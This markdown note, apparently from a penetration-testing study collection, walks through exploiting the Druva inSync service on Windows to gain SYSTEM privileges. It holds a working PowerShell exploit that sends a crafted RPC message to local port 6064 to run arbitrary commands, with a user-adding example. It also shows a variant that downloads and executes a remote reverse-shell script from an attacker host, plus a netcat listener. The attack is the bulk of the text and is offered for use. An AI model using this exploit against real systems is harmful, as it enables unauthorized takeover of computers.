# Vulnerable Services (Druva inSync).md

Sometimes, Windows computers have programs running that have security bugs. One such program is Druva inSync, which runs with very high privileges (SYSTEM user).

If this program is installed and running, we can send it special commands to get full control of the computer.

### Steps and Commands to Exploit Druva inSync Vulnerability
#### 1. Check Installed Programs on Target
Open Command Prompt or PowerShell on the target machine and run:
```
wmic product get name
```
Look for Druva inSync in the output.

#### 2. Check if Druva Service is Running and Listening on Port 6064
Run this to find if port 6064 is open:
```
netstat -ano | findstr 6064
```
Note the PID of the process listening on that port.

Find the process name by PID (replace 3324 with your PID):
```
get-process -Id 3324
```

Check if the Druva service is running:
```
get-service | ? {$_.DisplayName -like 'Druva*'}
```

#### 3. Run PowerShell Exploit Script on Target
Open PowerShell as administrator and allow script execution temporarily:
```
Set-ExecutionPolicy Bypass -Scope Process
```

Create and run this PowerShell script on the target (change $cmd as needed):
```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add" # Example command: add new user "pwnd"

$s = New-Object System.Net.Sockets.Socket(
[System.Net.Sockets.AddressFamily]::InterNetwork,
[System.Net.Sockets.SocketType]::Stream,
[System.Net.Sockets.ProtocolType]::Tcp
)

$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)00`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

#### 4. (Optional) Use Reverse Shell Instead of Adding a User
Prepare a PowerShell reverse shell script shell.ps1 on your attacker machine.

Start a Python HTTP server in the folder containing shell.ps1:
```
python3 -m http.server 8080
```

Modify $cmd in the exploit script on the target:
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<YOUR-IP>:8080/shell.ps1')"
```
Replace <YOUR-IP> with your attack machine IP.

#### 5. Start Netcat Listener on Attacker Machine
```
nc -lvnp 9443
```

### 6. Run the Exploit Script on the Target
After running the PowerShell exploit, you should receive a shell running as SYSTEM on the target machine.
